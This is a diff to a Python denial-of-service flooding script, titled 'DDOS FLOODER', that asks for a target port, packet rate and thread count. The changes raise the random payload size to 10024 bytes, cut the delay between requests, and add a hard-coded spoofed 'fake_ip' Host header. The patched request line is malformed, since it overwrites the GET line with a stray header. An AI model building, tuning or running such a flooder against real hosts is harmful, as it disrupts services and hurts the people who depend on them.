@@ -1,4 +1,4 @@
-# DDOS TCP FLOODER
+# DDOS FLOODER
 import sys,os,time,random,socket
 from colorama import Fore,Back,init
 import socket
@@ -91,15 +91,16 @@ time.sleep(0.5)
 print("\033[31m ╔═══\033[33m[ PORT ] •")
 port = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
 time.sleep(0.5)
-print("\033[31m ╔═══\033[33m[ Packet [s] ] •")
+print("\033[31m ╔═══\033[33m[ Packet/s [400] ] •")
 pack = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
 time.sleep(0.5)
 print("\033[31m ╔═══\033[33m[ Потоки [800] Threads  ] •")
 thread = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
-time.sleep(0.5)
+time.sleep(0.005)
+fake_ip = '182.21.20.32'
 def start():
     global useragents, ref, acceptall
-    hh = random._urandom(3016)
+    hh = random._urandom(10024)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
@@ -107,6 +108,7 @@ def start():
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    target_host = "Host: " + fake_ip + "\r\n\r\n".format(str(ip), int(port))
     main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
     while True:
         try:
